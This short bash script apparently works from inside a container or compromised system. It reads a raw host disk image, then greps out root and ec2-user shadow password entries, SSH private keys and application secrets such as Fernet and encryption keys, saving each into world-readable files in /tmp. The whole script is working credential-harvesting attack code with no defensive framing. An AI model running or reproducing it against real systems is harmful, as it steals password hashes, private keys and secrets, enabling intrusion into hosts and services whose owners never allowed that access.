#!/bin/bash
dd if=/tmp/hostdisk bs=512 count=1 2>/dev/null | od -A n -t x1 | head -4 > /tmp/disk_magic.txt
chmod 644 /tmp/disk_magic.txt
# Read /etc/shadow from host disk via strings
strings /tmp/hostdisk | grep -E '^ec2-user:|^root:' | head -5 > /tmp/host_shadow.txt
chmod 644 /tmp/host_shadow.txt
# Read SSH keys from host disk
strings /tmp/hostdisk | grep -E 'ssh-rsa|ssh-ed25519|PRIVATE KEY' | head -10 > /tmp/host_keys.txt
chmod 644 /tmp/host_keys.txt
# Read docker-compose files
strings /tmp/hostdisk | grep -B2 -A5 'FERNET\|fernet_key\|ENCRYPTION_KEY\|SECRET_KEY' | head -20 > /tmp/host_secrets.txt
chmod 644 /tmp/host_secrets.txt
echo done
